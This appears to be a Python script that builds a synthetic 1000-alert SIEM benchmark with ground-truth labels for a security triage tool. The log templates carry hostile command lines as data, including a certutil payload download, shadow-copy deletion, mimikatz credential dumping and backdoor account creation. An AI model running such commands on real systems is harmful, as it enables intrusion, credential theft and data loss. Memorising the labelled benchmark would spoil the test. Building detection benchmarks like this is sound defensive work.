#!/usr/bin/env python3
"""Generate 1000-alert benchmark corpus for ZOVARC v1.7.0.

Distribution:
  500 Path A (template types, fast_fill)
  200 Path B (template types, richer SIEM for LLM param fill)
  150 Path C (novel attack types, no template)
  150 Benign (routine system events)
"""
import json
import random
import hashlib
from datetime import datetime, timedelta

random.seed(42)  # Reproducible

# ─── HELPERS ───────────────────────────────────────────
def rand_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rand_internal_ip():
    return f"10.0.{random.randint(0,10)}.{random.randint(1,254)}"

def rand_host():
    prefixes = ["WS", "SRV", "DC", "DB", "APP", "WEB", "MAIL", "FS", "PROXY", "FW"]
    depts = ["HR", "FIN", "ENG", "SALES", "IT", "LEGAL", "OPS", "SEC", "DEV", "QA"]
    return f"{random.choice(prefixes)}-{random.choice(depts)}-{random.randint(1,50):02d}"

def rand_user():
    first = ["jsmith", "mthompson", "agarcia", "pchen", "rwilson", "klee", "djones", "lbrown", "nkumar", "fmartinez",
             "admin", "svc_backup", "svc_deploy", "helpdesk", "operator", "analyst", "dba", "netops", "secops", "devops"]
    return random.choice(first)

def rand_ts():
    base = datetime(2026, 3, 24, random.randint(0,23), random.randint(0,59), random.randint(0,59))
    return base.strftime("%Y-%m-%dT%H:%M:%SZ")

def make_alert(task_type, severity, title, rule_name, raw_log, ground_truth_verdict="true_positive", path="A"):
    # C2/beaconing/exfil: destination should be external (the C2 server)
    c2_types = ("network_beaconing", "c2_communication_hunt", "data_exfiltration")
    dest_ip = rand_ip() if task_type in c2_types else rand_internal_ip()
    return {
        "task_type": task_type,
        "severity": severity,
        "prompt": f"Investigate {title}",
        "siem_event": {
            "title": title,
            "source_ip": rand_ip() if path != "benign" else rand_internal_ip(),
            "destination_ip": dest_ip if path != "benign" else rand_internal_ip(),
            "hostname": rand_host(),
            "username": rand_user(),
            "rule_name": rule_name,
            "timestamp": rand_ts(),
            "raw_log": raw_log,
        },
        "ground_truth": {
            "verdict": ground_truth_verdict,
            "attack_type": task_type if ground_truth_verdict != "benign" else "benign",
            "path": path,
        },
    }

# ─── PATH A: 500 template alerts ──────────────────────
path_a = []

# 11 template types × ~45 alerts each
template_configs = [
    ("brute_force", "high", [
        ("SSH Brute Force", "BruteForce", "Failed password for {user} from {ip} port {port} ssh2"),
        ("RDP Brute Force", "RDP_BF", "EventID=4625 LogonType=10 SourceIP={ip} User={user} Status=0xC000006D"),
        ("HTTP Login Spray", "WebAuth_BF", "POST /login HTTP/1.1 401 Unauthorized from {ip} user={user} attempt={n}"),
    ]),
    ("phishing", "high", [
        ("Phishing URL Clicked", "PhishDetect", "User {user} clicked https://micros0ft-update.{domain}/login.php?verify=credential&token=abc from {host}. Subject: Your account will be suspended within 24 hours act now. Downloaded: invoice.pdf.exe (2.3MB). Process spawned: cmd.exe -> powershell.exe -enc {b64}"),
        ("Suspicious Email", "EmailSec", "From: security@micros0ft-update.{domain}\nReply-To: attacker@gmail.com\nSubject: Urgent: account suspended verify now immediately\nhttps://paypai-secure.{domain}/login.php?credential=verify\nAttachment: document.doc.exe"),
        ("Credential Harvest", "CredHarvest", "POST https://amaz0n-verify.{domain}/signin.php from {ip}\nAttachment: invoice.pdf.exe\nimmediate action required your account expires within 24 hours\nFrom: noreply@micros0ft.{domain}\nReply-To: phisher@gmail.com\nDNS query: evil-c2.{domain}"),
    ]),
    ("ransomware_triage", "critical", [
        ("Shadow Copy Deletion", "Ransomware", "vssadmin.exe delete shadows /all /quiet on {host} by {user}"),
        ("Mass File Encryption", "FileEncrypt", "FileRename: {n} files renamed to .encrypted on {host} in {sec}s"),
        ("Ransom Note Created", "RansomNote", "FileCreate: C:/README_DECRYPT.txt on {host} by process cipher.exe"),
    ]),
    ("data_exfiltration", "high", [
        ("Large Outbound Transfer", "DLP_Alert", "02:15:00 {user} POST https://mega.nz/upload content-length: 47312 MB from {host}. 02:15:30 Content-Encoding: gzip encrypted. 02:16:00 Transfer to {c2ip}:443 complete. Total: 47312 MB. Files: customer_database.csv, password_dump.sql, financial_statements.xlsx"),
        ("Cloud Storage Upload", "CloudExfil", "03:30:00 Saturday {user} uploaded 24000 MB to https://drive.google.com/upload from {host}. 03:30:15 Files: employee_records.csv, salary_data.xlsx. 03:30:30 Content-Encoding: base64 encrypted. Destination IP: {c2ip}"),
        ("DNS Tunneling", "DNS_Exfil", "02:15:00 {host} TXT query={subdomain}.exfil-dns.xyz from {ip} size={bytes} bytes base64 encoded\n02:15:30 {host} TXT query={subdomain}.exfil-dns.xyz from {ip} size={bytes} bytes\n02:16:00 Total: 8500 MB exfiltrated via DNS tunnel to {c2ip}. Content-Encoding: base64"),
    ]),
    ("privilege_escalation_hunt", "high", [
        ("Sudo Abuse", "PrivEsc", "sudo: {user} : COMMAND=/bin/bash on {host}\nsudo: {user} : COMMAND=/usr/bin/passwd root\nsudo: {user} : COMMAND=/usr/sbin/useradd backdoor -m -s /bin/bash\nCVE-2024-1086 exploit detected"),
        ("UAC Bypass", "UACBypass", "EventID=4672 SeDebugPrivilege assigned to {user} on {host}. EventID=4624 LogonType=3 elevated token. Process: fodhelper.exe spawned cmd.exe /c whoami /priv. Parent: C:/Tools/Rubeus.exe. All privileges enabled."),
        ("SUID Exploit", "SUID", "find / -perm -4000 executed by {user} on {host}\nchmod u+s /tmp/exploit\nCVE-2024-1086 kernel exploit\n{user} escalated from www-data to root via SUID binary /usr/bin/pkexec"),
    ]),
    ("c2_communication_hunt", "critical", [
        ("Periodic Beacon", "C2_Beacon", "09:00:00 {host} HTTPS -> {c2ip}:443 size=1024\n09:01:00 {host} HTTPS -> {c2ip}:443 size=1028\n09:02:01 {host} HTTPS -> {c2ip}:443 size=1024\npowershell.exe -enc {b64}"),
        ("DGA Domain", "DGA_Detect", "10:00:00 DNS query={dga}.xyz from {ip}\n10:01:00 DNS query={dga}.xyz from {ip}\n10:02:00 DNS query={dga}.xyz from {ip}\ncobalt strike beacon detected"),
        ("Encoded PowerShell", "PSEnc", "11:00:00 powershell.exe -enc {b64} on {host} by {user}\n11:01:00 HTTPS -> {c2ip}:443 size=2048\n11:02:00 HTTPS -> {c2ip}:443 size=2048\nmeterpreter session established"),
    ]),
    ("lateral_movement_detection", "critical", [
        ("PsExec Remote Exec", "LateralMove", "PsExec.exe \\\\{target} -u {user} cmd.exe from {host}"),
        ("WMI Remote", "WMI_Exec", "WMI Process Create on {target} from {host} by {user} cmd=calc.exe"),
        ("Pass-the-Hash", "PtH", "EventID=4624 LogonType=9 SourceIP={ip} User={user} NTLM pass-the-hash"),
    ]),
    ("insider_threat_detection", "high", [
        ("Bulk Data Download", "InsiderThreat", "SELECT * FROM customer_database by {user} at 03:15 Saturday 2500 rows"),
        ("USB Data Staging", "USB_Alert", "{user} copied {mb}MB to USB drive on {host} at {ts}"),
        ("Personal Cloud Upload", "DLP_Personal", "{user} uploaded to dropbox.com {mb}MB from {host}"),
    ]),
    ("network_beaconing", "high", [
        ("Regular Callback", "Beacon", "10:00:00 {host} HTTPS -> {c2ip}:443 size=1024\n10:01:00 {host} HTTPS -> {c2ip}:443 size=1028\n10:02:01 {host} HTTPS -> {c2ip}:443 size=1024\n10:03:00 {host} HTTPS -> {c2ip}:443 size=1030"),
        ("DNS Beacon", "DNS_Beacon", "10:00:00 DNS query={subdomain}.beacon.xyz from {ip}\n10:01:00 DNS query={subdomain}.beacon.xyz from {ip}\n10:02:01 DNS query={subdomain}.beacon.xyz from {ip}\n10:03:00 DNS query={subdomain}.beacon.xyz from {ip}"),
        ("HTTPS Beacon", "HTTPS_Beacon", "14:30:00 {host} HTTPS -> {c2ip}:8443 size=512\n14:31:00 {host} HTTPS -> {c2ip}:8443 size=508\n14:32:01 {host} HTTPS -> {c2ip}:8443 size=512\n14:33:00 {host} HTTPS -> {c2ip}:8443 size=510"),
    ]),
    ("cloud_infrastructure_attack", "critical", [
        ("IAM Role Creation", "CloudAttack", "AWS CloudTrail: CreateUser iam-backdoor by {user} from {ip} region ap-southeast-1 (first time). AttachRolePolicy AdministratorAccess. CreateAccessKey AKIA{h1}. MFA=false UserAgent=python-boto3"),
        ("CloudTrail Disabled", "TrailTamper", "StopLogging on CloudTrail main-trail by {user} from {ip}. DeleteFlowLogs on vpc-prod. PutRetentionPolicy days=1 on /aws/cloudtrail. 3 regions: us-east-1, eu-west-1, ap-southeast-1"),
        ("Security Group Open", "SG_Open", "AuthorizeSecurityGroupIngress 0.0.0.0/0 port 22 by {user} from {ip}. RunInstances: 20 x c5.4xlarge in ap-southeast-1 (cryptomining pattern). CreateAccessKey for {user}. Region never used before."),
    ]),
    ("supply_chain_compromise", "high", [
        ("Hash Mismatch", "SupplyChain", "npm install: hash mismatch for lodash@4.17.21 Expected:{h1} Got:{h2}"),
        ("Unsigned Package", "PkgSec", "GPG signature invalid for package colors@1.4.1 on {host}"),
        ("Build Pipeline Mod", "CI_Alert", ".github/workflows/deploy.yml modified by unknown contributor on {host}"),
    ]),
]

for task_type, severity, patterns in template_configs:
    count = 45 if task_type != "supply_chain_compromise" else 50  # Balance to 500
    for i in range(count):
        pat = patterns[i % len(patterns)]
        title, rule, raw_template = pat
        raw_log = raw_template.format(
            user=rand_user(), ip=rand_ip(), host=rand_host(), port=random.randint(10000,65000),
            n=random.randint(5,500), domain=f"{''.join(random.choices('abcdefghij',k=8))}.xyz",
            mb=random.randint(10,5000), sec=random.randint(1,60), ts=rand_ts(),
            target=rand_host(), c2ip=rand_ip(), bytes=random.randint(64,4096),
            subdomain=''.join(random.choices('abcdef0123456789',k=16)),
            dga=''.join(random.choices('abcdefghij0123456789',k=12)),
            b64=''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop0123456789+/',k=40)),
            h1=hashlib.md5(str(i).encode()).hexdigest(), h2=hashlib.md5(str(i+1000).encode()).hexdigest(),
        )
        path_a.append(make_alert(task_type, severity, f"{title} #{i+1}", rule, raw_log, path="A"))

# Trim to exactly 500
path_a = path_a[:500]

# ─── PATH B: 200 richer alerts ────────────────────────
path_b = []
for i in range(200):
    cfg = template_configs[i % len(template_configs)]
    task_type, severity, patterns = cfg
    pat = patterns[i % len(patterns)]
    title, rule, raw_template = pat
    raw_log = raw_template.format(
        user=rand_user(), ip=rand_ip(), host=rand_host(), port=random.randint(10000,65000),
        n=random.randint(5,500), domain=f"{''.join(random.choices('abcdefghij',k=8))}.xyz",
        mb=random.randint(10,5000), sec=random.randint(1,60), ts=rand_ts(),
        target=rand_host(), c2ip=rand_ip(), bytes=random.randint(64,4096),
        subdomain=''.join(random.choices('abcdef0123456789',k=16)),
        dga=''.join(random.choices('abcdefghij0123456789',k=12)),
        b64=''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop0123456789+/',k=40)),
        h1=hashlib.md5(str(i+500).encode()).hexdigest(), h2=hashlib.md5(str(i+1500).encode()).hexdigest(),
    )
    # Path B: add extra context fields to trigger LLM param fill
    alert = make_alert(task_type, severity, f"{title} (enriched #{i+1})", rule, raw_log, path="B")
    alert["siem_event"]["description"] = f"Enriched alert for {task_type} investigation with additional context"
    alert["siem_event"]["mitre_technique"] = f"T{random.randint(1000,1599)}.{random.randint(1,10):03d}"
    path_b.append(alert)

# ─── PATH C: 150 novel attacks ────────────────────────
path_c = []
novel_types = {
    "kerberoasting": ("Kerberoasting - SPN Enumeration", "T1558.003",
        "EventID=4769 ServiceName=MSSQLSvc/db{n}.corp.local TicketEncryptionType=0x17 ClientAddress={ip} User={user} RC4_DOWNGRADE=true RequestCount={n}"),
    "dcsync": ("DCSync - Replication Request", "T1003.006",
        "EventID=4662 ObjectType=DS-Replication-Get-Changes User={user} SourceIP={ip} TargetDC=DC-PRIMARY.corp.local"),
    "pass_the_ticket": ("Pass-the-Ticket Attack", "T1550.003",
        "EventID=4768 TicketOptions=0x40810000 User={user} SourceIP={ip} ServiceName=krbtgt EncryptionType=0x17 Anomalous=true"),
    "golden_ticket": ("Golden Ticket Detected", "T1558.001",
        "EventID=4769 User={user} SourceIP={ip} ServiceName=krbtgt TicketLifetime=87600h AnomalousKDC=true"),
    "lolbins": ("LOLBins Execution", "T1218",
        "Process=certutil.exe Args=-urlcache -split -f http://{ip}/payload.exe ParentProcess=cmd.exe User={user} Host={host}"),
    "process_injection": ("Process Injection Detected", "T1055",
        "Process=svchost.exe PID={n} InjectedBy={user} Technique=CreateRemoteThread SourcePID={n} Host={host}"),
    "dll_sideloading": ("DLL Side-Loading", "T1574.002",
        "Suspicious DLL loaded: C:/Users/{user}/AppData/version.dll by legitimate.exe Expected=C:/Windows/System32/version.dll Host={host}"),
    "persistence_registry": ("Registry Persistence", "T1547.001",
        "RegKey=HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run Value=backdoor.exe User={user} Host={host}"),
    "wmi_abuse": ("WMI Abuse - Remote Execution", "T1047",
        "WMI Process Create on {host} Command=cmd.exe /c powershell -enc {b64} SourceIP={ip} User={user}"),
    "credential_dumping": ("Credential Dumping - LSASS", "T1003.001",
        "Process=mimikatz.exe accessing lsass.exe PID=672 User={user} Host={host} Technique=sekurlsa::logonpasswords"),
    "shadow_copy_deletion": ("Shadow Copy Deletion", "T1490",
        "vssadmin.exe delete shadows /all /quiet executed by {user} on {host} followed by bcdedit /set recoveryenabled no"),
    "rdp_tunneling": ("RDP Tunneling Detected", "T1572",
        "RDP connection from {ip} via SSH tunnel port=3389 forwarded through localhost:4444 User={user} Host={host}"),
    "dns_exfiltration": ("DNS Data Exfiltration", "T1048.003",
        "Excessive DNS TXT queries to {subdomain}.exfil.xyz from {ip} BytesOut={bytes} Queries={n} in 60s Host={host}"),
    "powershell_obfuscation": ("Obfuscated PowerShell", "T1027",
        "powershell.exe -NoP -W Hidden -Enc {b64} StringLength=4096 EntropyScore=0.95 User={user} Host={host}"),
    "office_macro": ("Malicious Office Macro", "T1204.002",
        "WINWORD.EXE spawned cmd.exe /c powershell -enc {b64} User={user} Host={host} File=invoice.docm"),
}

for novel_type, (title, rule, raw_template) in novel_types.items():
    for i in range(10):
        raw_log = raw_template.format(
            user=rand_user(), ip=rand_ip(), host=rand_host(), n=random.randint(5,500),
            subdomain=''.join(random.choices('abcdef0123456789',k=16)),
            bytes=random.randint(1024,65536),
            b64=''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop0123456789+/',k=48)),
        )
        path_c.append(make_alert(novel_type, "high", f"{title} #{i+1}", rule, raw_log, path="C"))

# ─── BENIGN: 150 alerts ──────────────────────────────
benign = []
benign_types = [
    ("windows_update", "Windows Update", "wuauclt.exe /detectnow Status=Success KB5034441 on {host}"),
    ("scheduled_backup", "Scheduled Backup", "Veeam backup job completed for {host}. Duration: {n}min. Status: Success"),
    ("routine_auth", "User Login", "User {user} logged in from {ip} at 09:{n:02d} business hours on {host}"),
    ("dns_lookup", "DNS Query", "DNS query for windowsupdate.microsoft.com from {ip} Type=A TTL=300"),
    ("ntp_sync", "NTP Sync", "NTP sync with time.windows.com offset=0.{n:03d}s stratum=2 on {host}"),
    ("av_scan", "Antivirus Scan", "Defender scheduled scan completed on {host}. 0 threats found. Duration: {n}min"),
    ("software_inventory", "Software Inventory", "SCCM hardware inventory cycle completed for {host} by {user}"),
    ("cert_renewal", "Certificate Renewal", "Certificate CN=webapp.corp.local renewed on {host}. Expiry: 2027-03-24"),
    ("log_rotation", "Log Rotation", "logrotate: rotated {n} log files on {host}. Freed {n}GB disk space"),
    ("health_check", "Health Check", "Nagios check: all {n} services OK on {host}. Uptime: 99.99%"),
    ("patch_management", "Patch Applied", "WSUS approved {n} patches for {host}. All installed successfully."),
    ("ldap_query", "LDAP Query", "LDAP search base=DC=corp,DC=local filter=(sAMAccountName={user}) result=1"),
    ("snmp_poll", "SNMP Poll", "SNMP GET sysUpTime from {host}: {n} days. Status: normal"),
    ("user_login_business", "Business Login", "Successful login for {user} from {ip} at 08:30 Monday on {host}"),
    ("password_change", "Password Change", "{user} changed password via self-service portal on {host}. Policy compliant."),
]

for i in range(150):
    btype, title, raw_template = benign_types[i % len(benign_types)]
    raw_log = raw_template.format(user=rand_user(), ip=rand_internal_ip(), host=rand_host(), n=random.randint(1,99))
    benign.append(make_alert(btype, "low", f"{title} #{i+1}", "Routine", raw_log, ground_truth_verdict="benign", path="benign"))

# ─── ASSEMBLE CORPUS ──────────────────────────────────
corpus = {
    "version": "1.7.0",
    "generated": datetime.utcnow().isoformat() + "Z",
    "description": "1000-alert benchmark corpus for ZOVARC v1.7.0",
    "distribution": {
        "path_a_template": len(path_a),
        "path_b_llm_fill": len(path_b),
        "path_c_novel": len(path_c),
        "benign": len(benign),
        "total": len(path_a) + len(path_b) + len(path_c) + len(benign),
    },
    "alerts": path_a + path_b + path_c + benign,
}

output_path = "scripts/benchmark/corpus_1000.json"
with open(output_path, "w") as f:
    json.dump(corpus, f, indent=2)

print(f"Generated {corpus['distribution']['total']} alerts:")
for k, v in corpus["distribution"].items():
    if k != "total":
        print(f"  {k}: {v}")
print(f"Saved to {output_path}")
